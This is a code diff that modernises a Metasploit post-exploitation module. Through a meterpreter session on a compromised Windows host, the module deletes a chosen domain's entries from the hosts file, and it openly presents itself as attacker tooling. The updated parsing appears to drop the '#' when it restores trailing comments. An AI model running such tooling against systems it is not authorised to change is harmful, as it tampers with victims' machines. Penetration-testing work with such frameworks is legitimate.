@@ -1,67 +1,91 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Post
 
-require 'msf/core'
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Host File Entry Removal',
+        'Description' => %q{
+          This module allows the attacker to remove an entry from the Windows hosts file.
+        },
+        'License' => BSD_LICENSE,
+        'Author' => [ 'vt <nick.freeman[at]security-assessment.com>'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_channel_close
+              core_channel_eof
+              core_channel_open
+              core_channel_read
+              core_channel_tell
+              core_channel_write
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [CONFIG_CHANGES],
+          'Reliability' => []
+        }
+      )
+    )
 
-class Metasploit3 < Msf::Post
+    register_options(
+      [
+        OptString.new('DOMAIN', [ true, 'Domain name to remove from the hosts file.' ])
+      ]
+    )
+  end
 
-	def initialize(info={})
-		super( update_info( info,
-			'Name'          => 'Windows Manage Host File Entry Removal',
-			'Description'   => %q{
-				This module allows the attacker to remove an entry from the Windows hosts file.
-			},
-			'License'       => BSD_LICENSE,
-			'Author'        => [ 'vt <nick.freeman[at]security-assessment.com>'],
-			'Version'       => '$Revision$',
-			'Platform'      => [ 'windows' ],
-			'SessionTypes'  => [ 'meterpreter' ]
-		))
+  def hosts_path
+    root = client.sys.config.getenv('SystemRoot') ||
+           client.sys.config.getenv('windir') ||
+           'C:\\Windows'
+    "#{root}\\System32\\drivers\\etc\\hosts"
+  end
 
-		register_options(
-			[
-				OptString.new('DOMAIN', [ true, 'Domain name to remove from the hosts file.' ])
-			], self.class)
-	end
+  def run
+    hosttoremove = datastore['DOMAIN']
+    path = hosts_path
+    fd = client.fs.file.new(path, 'r+b')
 
+    # Get a temporary file path
+    meterp_temp = Tempfile.new('meterp')
+    meterp_temp.binmode
 
-	def run
-		hosttoremove = datastore['DOMAIN']
-		# remove hostname from hosts file
-		fd = client.fs.file.new("C:\\WINDOWS\\System32\\drivers\\etc\\hosts", "r+b")
+    print_status("Removing hosts file entry pointing to #{hosttoremove}")
 
-		# Get a temporary file path
-		meterp_temp = Tempfile.new('meterp')
-		meterp_temp.binmode
-		temp_path = meterp_temp.path
+    newfile = ''
+    fdray = fd.read.split("\r\n")
 
-		print_status("Removing hosts file entry pointing to #{hosttoremove}")
+    fdray.each do |line|
+      main_part = line.split('#', 2).first.to_s.strip
+      parts = main_part.split(/\s+/)
+      if parts[1..-1].to_a.include?(hosttoremove)
+        parts.delete_if { |p| p.casecmp(hosttoremove).zero? }
+        next if parts.size < 2
 
-		newfile = ''
-		fdray = fd.read.split("\r\n")
+        rebuilt = parts.join(' ')
+        rebuilt += " " + line.split('#', 2).last if line.include?('#')
+        newfile += "#{rebuilt}\r\n"
+      else
+        newfile += "#{line}\r\n"
+      end
+    end
 
-		fdray.each do |line|
-			if line.match("\t#{hosttoremove}$")
-			else
-				newfile += "#{line}\r\n"
-			end
-		end
+    fd.close
 
-		fd.close
+    meterp_temp.write(newfile)
+    meterp_temp.close
 
-		meterp_temp.write(newfile)
-		meterp_temp.close
-
-		client.fs.file.upload_file('C:\\WINDOWS\\System32\\drivers\\etc\\hosts', meterp_temp)
-		print_good("Done!")
-	end
-
+    client.fs.file.upload_file(path, meterp_temp)
+    print_good('Done!')
+  end
 end
